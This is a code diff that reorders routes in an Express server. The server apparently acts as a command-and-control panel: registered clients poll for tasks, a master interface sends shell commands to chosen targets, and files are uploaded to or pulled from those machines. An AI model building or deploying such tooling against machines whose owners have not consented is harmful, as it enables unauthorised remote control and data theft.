@@ -398,11 +398,11 @@ const html = `<!DOCTYPE html>
 </html>`;
 
 // ---------- Routes ----------
+// HTML routes (specific paths first)
 app.get('/', (req, res) => res.send(html));
 app.get('/master', (req, res) => res.send(html));
-app.get('/:uuid', (req, res) => res.send(html));
 
-// ---------- Client registration ----------
+// ---------- API routes (MUST COME BEFORE /:uuid) ----------
 app.post('/register', (req, res) => {
   const clientId = uuidv4();
   clients.set(clientId, {
@@ -418,7 +418,6 @@ app.post('/register', (req, res) => {
   res.json({ clientId });
 });
 
-// ---------- Client polling ----------
 app.get('/poll', (req, res) => {
   const clientId = req.query.clientId;
   if (!clientId || !clients.has(clientId)) {
@@ -436,7 +435,6 @@ app.get('/poll', (req, res) => {
   res.json({ task: task || null });
 });
 
-// ---------- Client result ----------
 app.post('/result', (req, res) => {
   const { clientId, taskId, output, fileData } = req.body;
   if (!clientId || !clients.has(clientId)) {
@@ -450,7 +448,7 @@ app.post('/result', (req, res) => {
   if (output !== undefined) {
     const history = clientHistory.get(clientId) || [];
     history.push({ timestamp: Date.now(), output });
-    if (history.length > 100) history.shift(); // limit
+    if (history.length > 100) history.shift();
     clientHistory.set(clientId, history);
   }
   if (fileData) {
@@ -462,10 +460,6 @@ app.post('/result', (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Serve downloads ----------
-app.use('/downloads', express.static('downloads'));
-
-// ---------- Get clients (for UI) ----------
 app.get('/clients', (req, res) => {
   const list = [];
   for (const [id, client] of clients) {
@@ -477,13 +471,12 @@ app.get('/clients', (req, res) => {
       output: lastOutput,
       cwd: client.cwd || '/',
       status,
-      history: history.slice(-10) // last 10 entries
+      history: history.slice(-10)
     });
   }
   res.json({ clients: list });
 });
 
-// ---------- Send command ----------
 app.post('/command', (req, res) => {
   const { cmd, targets } = req.body;
   if (!cmd) return res.status(400).json({ error: 'No command' });
@@ -498,7 +491,6 @@ app.post('/command', (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Upload file ----------
 app.post('/upload', upload.single('file'), (req, res) => {
   const file = req.file;
   if (!file) return res.status(400).json({ error: 'No file' });
@@ -516,7 +508,6 @@ app.post('/upload', upload.single('file'), (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Download request ----------
 app.post('/download-request', (req, res) => {
   const { path: remotePath, targets } = req.body;
   if (!remotePath) return res.status(400).json({ error: 'No path' });
@@ -529,6 +520,11 @@ app.post('/download-request', (req, res) => {
   }
   res.json({ ok: true });
 });
+
+app.use('/downloads', express.static('downloads'));
+
+// ---------- Catch-all for viewer mode (MUST BE LAST) ----------
+app.get('/:uuid', (req, res) => res.send(html));
 
 // ---------- Start server ----------
 const PORT = process.env.PORT || 8080;
